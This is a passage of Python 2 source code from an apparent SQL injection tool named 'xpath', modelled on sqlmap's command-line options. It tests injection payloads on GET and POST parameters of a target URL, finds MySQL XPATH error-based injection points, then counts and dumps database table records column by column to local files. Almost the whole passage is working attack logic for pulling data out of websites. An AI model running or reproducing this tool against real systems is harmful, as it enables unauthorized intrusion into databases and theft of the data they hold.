                                KeyBoardInterrupt()
                                break
                if Query_Test:
                    break
            
            f.write(infos)
            fd.write(dumps)
            fd.close()
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb

#-------------------------------------------------------------------------------------------------------------------#
#                                           POST DATA INJECTION                                                     #
#-------------------------------------------------------------------------------------------------------------------#
    elif url != None and data != None:
        ColumnList = (col)
        try:
            tempf = open(payload,'r')
        except (Exception, IOError) as e:
            if 'No such file or directory' in e:
                vul = False
                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
                    try:
                        if not vul:
                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
                            if '*' in data:
                                first, last = data.split('*')
                                tgt = first + temp + last
                                
                            else:
                                tgt = data + temp

                            try:
                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
                                req = Request(url, data=tgt, headers={'User-agent':ua})
                                HTTPReqCount += 1
                                resp = urlopen(req, timeout=10)
                            except URLError as e:
                                URLError()
                                sleep(1)
                                pass
                            except HTTPError as e:
##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                sleep(1)
                                pass
                            except (IOError, httplib.HTTPException) as e:
                                ConnTimeOut()
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                            else:
                                try:
                                    respdata = resp.read()
                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                    if 'XPATH syntax error' in respdata:
                                        vul = True
                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                        print fw + sn + '---'
                                        infos += '---\n'
                                        print fw + sn + 'Parameter: (GET)'
                                        infos += 'Parameter: (GET)\n'
                                        print fw + sn + '\tType: error-based'
                                        infos += '\tType: error-based\n'
                                        print fw + sn + '\tTitle: %s' % test
                                        infos += '\tTitle: %s\n' % test
                                        print fw + sn + '\tPayload: %s' % tgt
                                        infos += '\tPayload: %s\n' % tgt
                                        # ----------------------------------------
                                        # for later usage of dumiping other things
                                        CreatePayloadFile()
                                        with open(payload,'w') as ft:
                                            ft.write('%s' % tgt)
                                            ft.close()
                                        # ----------------------------------------
                                        print fw + sn + '---'
                                        infos += '---\n'
                                except IndexError as e:
                                    pass
                                except Exception as e:
                                    pass
                                except KeyboardInterrupt:
                                    KeyBoardInterrupt()
                                    break
                                else:
                                    Query_Test = False
                                    if wsr and war:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
                                    infos += "the back-end DBMS: MySQL\n"
                                    out = ', '.join(map(str,ColumnList))
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching entries of column(s) '%s' for table '%s' in database '%s'" % (out,tbl, db)
                                    for QueryIndex in REC_COUNT_FROM_TBL:
                                        if not Query_Test:
                                            QueryToTest = QueryIndex % (db,tbl)
                                            if '0x72306f74' in tgt:
                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        no_of_recs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            Query_Test = True
                                                            if '0' in no_of_recs:
                                                                print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
                                                                break
                                                            else:
                                                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
                                                                dbvul = False
                                                                for QueryIndex in REC_DUMP_FROM_TBL:
                                                                    if not dbvul:
                                                                        QueryToTest = QueryIndex % (ColumnList[0],db,tbl)
                                                                        if '0x72306f74' in tgt:
                                                                            FinalDumpQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                                            try:
                                                                                req = Request(url, data=FinalDumpQuery_replaced, headers={'User-agent':ua})
                                                                                resp = urlopen(req, timeout=10)
                                                                            except URLError as e:
                                                                                URLError()
                                                                                sleep(1)
                                                                                pass
                                                                            except HTTPError as e:
    ##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                                sleep(1)
                                                                                pass
                                                                            except (IOError, httplib.HTTPException) as e:
                                                                                ConnTimeOut()
                                                                                pass
                                                                            except KeyboardInterrupt:
                                                                                KeyBoardInterrupt()
                                                                                break
                                                                            else:
                                                                                try:
                                                                                    respdata = resp.read()
                                                                                    isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                    if 'XPATH syntax error' in respdata:
                                                                                        dbvul = True
                                                                                        if '%20' in FinalDumpQuery_replaced:
                                                                                            testQuery = FinalDumpQuery_replaced.replace('%20','%%20')  
                                                                                        else:
                                                                                            testQuery = FinalDumpQuery_replaced
                                                                                        
                                                                                        if 'CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)' in testQuery:
                                                                                            DbDumpQuery = testQuery.replace('CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)','CONCAT/**_**/(/*!50000%s*/)')

                                                                                        elif 'CONCAT('+str(ColumnList[0])+')' in testQuery:
                                                                                            DbDumpQuery = testQuery.replace('CONCAT('+str(ColumnList[0])+')','CONCAT(%s)')
                                                                                            
                                                                                        else:
                                                                                            pass
                                                                                        
                                                                                        temp = 0
                                                                                        nor = int(no_of_recs)
                                                                                        infos += "Database: %s\n" % db
                                                                                        infos += "Table: %s\n" % tbl
                                                                                        infos += "["+str(nor)+" recs]\n"
                                                                                        tmp = ""
                                                                                        while temp < nor:
                                                                                            t = 0
                                                                                            for columns in ColumnList:
                                                                                                if 'LIMIT/**_**/0' in DbDumpQuery:
                                                                                                    tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
                                                                                                elif 'LIMIT%%20' in DbDumpQuery:
                                                                                                    tempQuery = DbDumpQuery.replace('LIMIT%%200','LIMIT%%20%d' % temp)
                                                                                                else:
                                                                                                    tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
                                                                                                    
                                                                                                if 'LIMIT%20' in tempQuery:
                                                                                                    tempQuery = tempQuery.replace('LIMIT%20','LIMIT%%20')
                                                                                                else:
                                                                                                    tempQuery = tempQuery
                                                                                                    
                                                                                                RecordsnumpQuery = tempQuery % (columns)
                                                                                                try:
                                                                                                    req = Request(url, data=RecordsnumpQuery, headers={'User-agent':ua})
                                                                                                    resp = urlopen(req, timeout=30)
                                                                                                except URLError as e:
                                                                                                    URLError()
                                                                                                    if temp == 0:
                                                                                                        temp = 0
                                                                                                    else:
                                                                                                        temp = temp
                                                                                                    sleep(1)
                                                                                                    pass
                                                                                                except HTTPError as e:
    ##                                                                                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                                                    sleep(1)
                                                                                                    pass
                                                                                                except (IOError, httplib.HTTPException) as e:
                                                                                                    ConnTimeOut()
                                                                                                    if temp == 0:
                                                                                                        temp = 0
                                                                                                    else:
                                                                                                        temp = temp
                                                                                                    pass
                                                                                                except KeyboardInterrupt:
                                                                                            
                                                                                                    print fw + sn + "Database: %s" % db
                                                                                                    print fw + sn + "Table: %s" % tbl
                                                                                                    print fw + sn + "[Dumped "+str(temp)+" records]:"
                                                                                                    print fw + sn + tmp
                                                                                                    fd.write(dumps)
                                                                                                    fd.close()
                                                                                                    f.write(infos)
                                                                                                    f.close()
                                                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
                                                                                                    KeyBoardInterrupt()
                                                                                                    break
                                                                                                else:
                                                                                                    try:
                                                                                                        respdata = resp.read()
                                                                                                        records = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                                        if 'XPATH syntax error' in respdata:
                                                                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % records
                                                                                                            infos += "[*] %s\n" % records
                                                                                                            dumps += "{},".format(records)
                                                                                                            tmp += "[*] %s\n" % records
                                                                                                            t += 1
                                                                                                            
                                                                                                    except IndexError as e:
                                                                                                        pass
                                                                                                    except Exception as e:
                                                                                                        pass
                                                                                                    except KeyboardInterrupt:
                                                                                                        KeyBoardInterrupt()
                                                                                                        break  
                                                                                            check = len(ColumnList)
                                                                                            if t == check:
                                                                                                dumps += "\n"
                                                                                                temp += 1
                                                                                            else:
                                                                                                pass

                                                                                        print fg + sb + "Database: %s" % db
                                                                                        print fg + sb + "Table: %s" % tbl
                                                                                        print fg + sb + "["+str(nor)+" records]"
                                                                                        print fg + sb + tmp
                                                                                            
                                                                                except IndexError as e:
                                                                                    pass
                                                                                except Exception as e:
                                                                                    pass
                                                                                except KeyboardInterrupt:
                                                                                    KeyBoardInterrupt()
                                                                                    break
                                                                    if dbvul:
                                                                        break
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if Query_Test:
                                            break            
                        if vul:
                            break
                    except (TypeError, IOError, IndexError):
                        pass
                    except KeyboardInterrupt:
                        KeyBoardInterrupt()
                        break
                    
            f.write(infos)
            fd.write(dumps)
            fd.close()
            f.close()
            
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
            
        else:
            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
            with open(logs, "r") as prev_session:
                for line in islice(prev_session,1,7):
                    out = line.rstrip()
                    if out:
                        print fw + sn + out
                        infos += out+"\n"
            prev_session.close()
            HTTPResponses(url, data)
            Query_Test = False
            tempfread = tempf.readline()
            if wsr and war:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                infos += "web server technology: %s, %s\n" % (war, wsr)
            else:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                infos += "web server technology: %s\n" % wsr
            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
            infos += "the back-end DBMS: MySQL\n"
            out = ', '.join(map(str,ColumnList))
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching entries of column(s) '%s' for table '%s' in database '%s'" % (out,tbl, db)
            for QueryIndex in REC_COUNT_FROM_TBL:
                if not Query_Test:
                    QueryToTest = QueryIndex % (db,tbl)
                    if '0x72306f74' in tempfread:
                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                        try:
                            req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                            resp = urlopen(req, timeout=10)
                        except URLError as e:
                            URLError()
                            sleep(1)
                            pass
                        except HTTPError as e:
##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                            sleep(1)
                            pass
                        except (IOError, httplib.HTTPException) as e:
                            ConnTimeOut()
                            pass
                        except KeyboardInterrupt:
                            KeyBoardInterrupt()
                            break
                        else:
                            try:
                                respdata = resp.read()
                                no_of_recs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                if 'XPATH syntax error' in respdata:
                                    Query_Test = True
                                    if '0' in no_of_recs:
                                        print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
                                        break
                                    else:
                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
                                        dbvul = False
                                        for QueryIndex in REC_DUMP_FROM_TBL:
                                            if not dbvul:
                                                QueryToTest = QueryIndex % (ColumnList[0],db,tbl)
                                                if '0x72306f74' in tempfread:
                                                    FinalDumpQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                                                    try:
                                                        req = Request(url, data=FinalDumpQuery_replaced, headers={'User-agent':ua})
                                                        resp = urlopen(req, timeout=10)
                                                    except URLError as e:
                                                        URLError()
                                                        sleep(1)
                                                        pass
                                                    except HTTPError as e:
    ##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                        sleep(1)
                                                        pass
                                                    except (IOError, httplib.HTTPException) as e:
                                                        ConnTimeOut()
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                                    else:
                                                        try:
                                                            respdata = resp.read()
                                                            isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                            if 'XPATH syntax error' in respdata:
                                                                dbvul = True
                                                                if '%20' in FinalDumpQuery_replaced:
                                                                    testQuery = FinalDumpQuery_replaced.replace('%20','%%20')  
                                                                else:
                                                                    testQuery = FinalDumpQuery_replaced
                                                                
                                                                if 'CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)' in testQuery:
                                                                    DbDumpQuery = testQuery.replace('CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)','CONCAT/**_**/(/*!50000%s*/)')

                                                                elif 'CONCAT('+str(ColumnList[0])+')' in testQuery:
                                                                    DbDumpQuery = testQuery.replace('CONCAT('+str(ColumnList[0])+')','CONCAT(%s)')
                                                                    
                                                                else:
                                                                    pass
                                                                
                                                                temp = 0
                                                                nor = int(no_of_recs)
                                                                infos += "Database: %s\n" % db
                                                                infos += "Table: %s\n" % tbl
                                                                infos += "["+str(nor)+" recs]\n"
                                                                tmp = ""
                                                                while temp < nor:
                                                                    t = 0
                                                                    for columns in ColumnList:
                                                                        if 'LIMIT/**_**/0' in DbDumpQuery:
                                                                            tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
                                                                        elif 'LIMIT%%20' in DbDumpQuery:
                                                                            tempQuery = DbDumpQuery.replace('LIMIT%%200','LIMIT%%20%d' % temp)
                                                                        else:
                                                                            tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
                                                                            
                                                                        if 'LIMIT%20' in tempQuery:
                                                                            tempQuery = tempQuery.replace('LIMIT%20','LIMIT%%20')
                                                                        else:
                                                                            tempQuery = tempQuery
                                                                            
                                                                        RecordsnumpQuery = tempQuery % (columns)
                                                                        try:
                                                                            req = Request(url, data=RecordsnumpQuery, headers={'User-agent':ua})
                                                                            resp = urlopen(req, timeout=30)
                                                                        except URLError as e:
                                                                            URLError()
                                                                            if temp == 0:
                                                                                temp = 0
                                                                            else:
                                                                                temp = temp
                                                                            sleep(1)
                                                                            pass
                                                                        except HTTPError as e:
    ##                                                                        print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                            sleep(1)
                                                                            pass
                                                                        except (IOError, httplib.HTTPException) as e:
                                                                            ConnTimeOut()
                                                                            if temp == 0:
                                                                                temp = 0
                                                                            else:
                                                                                temp = temp
                                                                            pass
                                                                        except KeyboardInterrupt:
                                                                            print fw + sn + "Database: %s" % db
                                                                            print fw + sn + "Table: %s" % tbl
                                                                            print fw + sn + "["+str(temp)+" records]:"
                                                                            print fw + sn + tmp
                                                                            fd.write(dumps)
                                                                            fd.close()
                                                                            f.write(infos)
                                                                            f.close()
                                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
                                                                            KeyBoardInterrupt()
                                                                            break
                                                                        else:
                                                                            try:
                                                                                respdata = resp.read()
                                                                                records = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                if 'XPATH syntax error' in respdata:
                                                                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % records
                                                                                    infos += "[*] %s\n" % records
                                                                                    dumps += "{},".format(records)
                                                                                    tmp += "[*] %s\n" % records
                                                                                    t += 1
                                                                                    
                                                                            except IndexError as e:
                                                                                pass
                                                                            except Exception as e:
                                                                                pass
                                                                            except KeyboardInterrupt:
                                                                               
                                                                                KeyBoardInterrupt()
                                                                                break  
                                                                    check = len(ColumnList)
                                                                    if t == check:
                                                                        dumps += "\n"
                                                                        temp += 1
                                                                    else:
                                                                        pass

                                                                print fw + sn + "Database: %s" % db
                                                                print fw + sn + "Table: %s" % tbl
                                                                print fw + sn + "["+str(nor)+" records]"
                                                                print fw + sn + tmp
                                                                    
                                                        except IndexError as e:
                                                            pass
                                                        except Exception as e:
                                                            pass
                                                        except KeyboardInterrupt:
                                                            KeyBoardInterrupt()
                                                            break
                                            if dbvul:
                                                break
                            except IndexError as e:
                                pass
                            except Exception as e:
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                if Query_Test:
                    break
            
            f.write(infos)
            fd.write(dumps)
            fd.close()
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
            
    else:
        pass


def Main():
    
    global ret
    usage = "Usage: %prog -u <target> [options]"
    version = "%prog version 1.0"
    parser = optparse.OptionParser(usage=usage,version=version)
    group = optparse.OptionGroup(parser, "Target",
                        "At least one of these options has to be provided to define the "
                        " target(s)")
    group.add_option("-u","--url", dest="url", type=str, \
            help='Target URL (e.g. "http://www.site.com/vuln.php?id=1")')
    parser.add_option_group(group)
    group = optparse.OptionGroup(parser, "Request",
                        "These options can be used to specify how to connect to the target URL")
    group.add_option("--data", dest="data", type=str, \
            help="Data string to be sent through POST")
    parser.add_option_group(group)
    group = optparse.OptionGroup(parser, "Enumeration",
                        "These options can be used to enumerate the back-end database "
                        " managment system information, structure and data contained in the "
                        " tables.")
    group.add_option("-b", "--banner", action='store_const', const='banner', dest='element',\
            help="Retrieve DBMS banner")
    group.add_option("--current-user", action='store_const', const='current_user', dest='element',\
            help="Retrieve DBMS current user")
    group.add_option("--current-db", action='store_const', const='current_db', dest='element',\
            help="Retrieve DBMS current database")
    group.add_option("--hostname", action='store_const', const='hostname', dest='element',\
            help="Retrieve DBMS server hostname")
    group.add_option("--dbs", action='store_const', const='dbs', dest='element',\
            help="Enumerate DBMS databases")
    group.add_option("--tables", action='store_const', const='tables', dest='element', \
            help="Enumerate DBMS database tables")
    group.add_option("--columns", action='store_const', const='columns', dest='element', \
            help="Enumerate DBMS database table columns")
    group.add_option("--dump", action='store_const', const='dump', dest='element',\
            help="Dump DBMS database table entries")
    group.add_option("-D", dest='db', type=str, \
            help="DBMS database to enumerate")
    group.add_option("-T", dest='tbl', type=str, \
            help="DBMS database tables(s) to enumerate")
    group.add_option("-C", dest='col', type=str, \
            help="DBMS database table column(s) to enumerate")
    parser.add_option_group(group)

    
    (options, args) = parser.parse_args()
    ret = options.element
    
    if not options.url:
        print parser.usage

#-----------------------------------------------------------------------------------------------------
#                                           GET INJECTION
#-----------------------------------------------------------------------------------------------------

    elif options.url and not options.data and not options.db and not options.tbl and not options.col:
        
        if 'http://' in options.url:
            tgt = options.url
        elif 'https://' in options.url:
            tgt = options.url
        else:
            tgt = 'http://%s' % (options.url)
            
        data = None
        PathToTheOutput(tgt) 
        if ret == None:
            print fr + sn + "\n["+strftime("%H:%M:%S")+"] [ERROR] Please insert options (e.g: http://www.example.com/index.php?id=1 --dbs)"
            print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
            pass
        elif ret == 'dbs':
            xpbanner()
            print fg + sb + "\n[*] starting at "+strftime("%H:%M:%S")+"\n"
            try:
                HTTPResponses(tgt, data)
                dumpDbs(tgt, data)
            except KeyboardInterrupt:
                print fr + sn + '['+strftime("%H:%M:%S")+'] [ERROR] user aborted'
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"    
                sys.exit(0)
            else:
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
                
        elif ret == 'banner':
            xpbanner()   
            print fg + sb + "\n[*] starting at "+strftime("%H:%M:%S")+"\n"
            try:
                HTTPResponses(tgt, data)
                banner(tgt, data)
            except KeyboardInterrupt:
                print fr + sn + '['+strftime("%H:%M:%S")+'] [ERROR] user aborted'
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"    
                sys.exit(0)
            else:
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
                
        elif ret == 'current_db':
            xpbanner()
            print fg + sb + "\n[*] starting at "+strftime("%H:%M:%S")+"\n"
            try:
                HTTPResponses(tgt, data)
                current_db(tgt, data)
            except KeyboardInterrupt:
                print fr + sn + '['+strftime("%H:%M:%S")+'] [ERROR] user aborted'
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"    
                sys.exit(0)
            else:
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"

        elif ret == 'current_user':
            xpbanner()
            print fg + sb + "\n[*] starting at "+strftime("%H:%M:%S")+"\n"
            try:
                HTTPResponses(tgt, data)
                current_user(tgt, data)
            except KeyboardInterrupt:
                print fr + sn + '['+strftime("%H:%M:%S")+'] [ERROR] user aborted'
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"    
                sys.exit(0)
            else:
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"

        elif ret == 'hostname':
            xpbanner()
            print fg + sb + "\n[*] starting at "+strftime("%H:%M:%S")+"\n"
            try:
                HTTPResponses(tgt, data)
                hostname(tgt, data)
            except KeyboardInterrupt:
                print fr + sn + '['+strftime("%H:%M:%S")+'] [ERROR] user aborted'
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"    
                sys.exit(0)
            else:
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"

        
    elif options.url and options.db and not options.tbl and not options.data:
        
        if 'http://' in options.url:
            tgt = options.url
        elif 'https://' in options.url:
            tgt = options.url
        else:
            tgt = 'http://%s' % (options.url)
            
        Db = options.db
        data = None
        PathToTheOutput(tgt)
        
        if ret == 'tables':
            xpbanner()
            print fg + sb + "\n[*] starting at "+strftime("%H:%M:%S")+"\n"
            try:

                HTTPResponses(tgt, data)
                dumpTbl(tgt, data, Db)
            except KeyboardInterrupt:
                print fr + sn + '['+strftime("%H:%M:%S")+'] [ERROR] user aborted'
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"    
                sys.exit(0)
            else:
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"

        else:
            print fr + sn + "\n["+strftime("%H:%M:%S")+"] [ERROR] Please insert options (e.g: http://www.example.com/index.php?id=1 -D abc --tables)"
            print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
            pass

    elif options.url and options.db and options.tbl and not options.col and not options.data:
        
        if 'http://' in options.url:
            tgt = options.url
        elif 'https://' in options.url:
            tgt = options.url
        else:
            tgt = 'http://%s' % (options.url)
            
        Db = options.db
        Tbl = options.tbl
        data = None
        PathToTheOutput(tgt)
        
        if ret == 'columns':
            xpbanner()
            print fg + sb + "\n[*] starting at "+strftime("%H:%M:%S")+"\n"
            try:
                HTTPResponses(tgt, data)
                dumpCols(tgt, data, Db, Tbl)
            except KeyboardInterrupt:
                print fr + sn + '['+strftime("%H:%M:%S")+'] [ERROR] user aborted'
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"    
                sys.exit(0)
            else:
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
            
        else:
            print fr + sn + "\n["+strftime("%H:%M:%S")+"] [ERROR] Please insert options (e.g: http://www.example.com/index.php?id=1 -D abc -T abc --columns)"
            print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
            pass


    elif options.url and options.db and options.tbl and options.col and not options.data:

        if 'http://' in options.url:
            tgt = options.url
        elif 'https://' in options.url:
            tgt = options.url
        else:
            tgt = 'http://%s' % (options.url)
            
        Db = options.db
        Tbl = options.tbl
        colList = str(options.col).split(',')
        data = None
        PathToTheOutput(tgt)
        DumpedDb(Db,Tbl)
        
        if ret == 'dump':
            xpbanner()
            print fg + sb + "\n[*] starting at "+strftime("%H:%M:%S")+"\n"
            try:

                HTTPResponses(tgt, data)
                dumpTblRecords(tgt, data, Db, Tbl, colList)
                
            except KeyboardInterrupt:
                print fr + sn + '['+strftime("%H:%M:%S")+'] [ERROR] user aborted'
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"    
                sys.exit(0)
            else:
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
                
        else:
            print fr + sn + "\n["+strftime("%H:%M:%S")+"] [ERROR] Please insert options (e.g: http://www.example.com/index.php?id=1 -D abc -T abc -C a,b,c --dump)"
            print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
            pass
        
#------------------------------------------------------------------------------------------------------
#                                           POST INJECTION
#------------------------------------------------------------------------------------------------------
    elif options.url and options.data and not options.db and not options.tbl and not options.col:
        
        if 'http://' in options.url:
            tgt = options.url
        elif 'https://' in options.url:
            tgt = options.url
        else:
            tgt = 'http://%s' % (options.url)
            
        data = options.data
        PathToTheOutput(tgt)
        
        if ret == None:
            print fr + sn + "\n["+strftime("%H:%M:%S")+"] [ERROR] Please insert options (e.g: http://www.example.com/ --data=index.php?id=1 --dbs)"
            print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
            pass
        
        elif ret == 'dbs':
            xpbanner()
            print fg + sb + "\n[*] starting at "+strftime("%H:%M:%S")+"\n"
            try:
                
                HTTPResponses(tgt, data)
                dumpDbs(tgt, data)
                
            except KeyboardInterrupt:
                print fr + sn + '['+strftime("%H:%M:%S")+'] [ERROR] user aborted'
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"    
                sys.exit(0)
            else:
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
                
        elif ret == 'banner':
            xpbanner()
            print fg + sb + "\n[*] starting at "+strftime("%H:%M:%S")+"\n"
            try:
                HTTPResponses(tgt, data)
                banner(tgt, data)
            except KeyboardInterrupt:
                print fr + sn + '['+strftime("%H:%M:%S")+'] [ERROR] user aborted'
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"    
                sys.exit(0)
            else:
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
                
        elif ret == 'current_db':
            xpbanner()
            print fg + sb + "\n[*] starting at "+strftime("%H:%M:%S")+"\n"
            try:
                HTTPResponses(tgt, data)
                current_db(tgt, data)
            except KeyboardInterrupt:
                print fr + sn + '['+strftime("%H:%M:%S")+'] [ERROR] user aborted'
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"    
                sys.exit(0)
            else:
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"

        elif ret == 'current_user':
            xpbanner()
            print fg + sb + "\n[*] starting at "+strftime("%H:%M:%S")+"\n"
            try:
                HTTPResponses(tgt, data)
                current_user(tgt, data)
            except KeyboardInterrupt:
                print fr + sn + '['+strftime("%H:%M:%S")+'] [ERROR] user aborted'
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"    
                sys.exit(0)
            else:
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"

        elif ret == 'hostname':
            xpbanner()
            print fg + sb + "\n[*] starting at "+strftime("%H:%M:%S")+"\n"
            try:
                HTTPResponses(tgt, data)
                hostname(tgt, data)
            except KeyboardInterrupt:
                print fr + sn + '['+strftime("%H:%M:%S")+'] [ERROR] user aborted'
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"    
                sys.exit(0)
            else:
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
                
        
    elif options.url and options.data and options.db and not options.tbl and not options.col:
        
        if 'http://' in options.url:
            tgt = options.url
        elif 'https://' in options.url:
            tgt = options.url
        else:
            tgt = 'http://%s' % (options.url)
            
        Db = options.db
        data = options.data
        PathToTheOutput(tgt)
        if ret == 'tables':
            xpbanner()
            print fg + sb + "\n[*] starting at "+strftime("%H:%M:%S")+"\n"
            try:


                HTTPResponses(tgt, data)
                dumpTbl(tgt, data, Db)
                
            except KeyboardInterrupt:
                print fr + sn + '['+strftime("%H:%M:%S")+'] [ERROR] user aborted'
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"    
                sys.exit(0)
            else:
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
        else:
